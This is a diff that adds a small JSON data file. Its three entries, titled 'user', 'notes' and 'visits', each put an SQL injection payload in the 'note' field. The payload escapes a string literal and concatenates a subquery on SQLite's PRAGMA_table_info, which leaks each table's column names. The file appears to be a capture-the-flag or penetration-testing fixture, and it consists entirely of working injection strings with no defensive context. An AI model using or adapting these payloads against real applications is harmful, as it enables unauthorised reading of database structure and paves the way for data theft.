@@ -1,0 +1,17 @@
+{
+  "3001": {
+    "encrypted": 0,
+    "note": "' || CAST((SELECT GROUP_CONCAT(name, ' | ') FROM PRAGMA_table_info('user')) AS TEXT) || '",
+    "title": "user"
+  },
+  "3002": {
+      "encrypted": 0,
+      "note": "' || CAST((SELECT GROUP_CONCAT(name, ' | ') FROM PRAGMA_table_info('notes')) AS TEXT) || '",
+      "title": "notes"
+  },
+  "3003": {
+      "encrypted": 0,
+      "note": "' || CAST((SELECT GROUP_CONCAT(name, ' | ') FROM PRAGMA_table_info('visits')) AS TEXT) || '",
+      "title": "visits"
+  }
+}
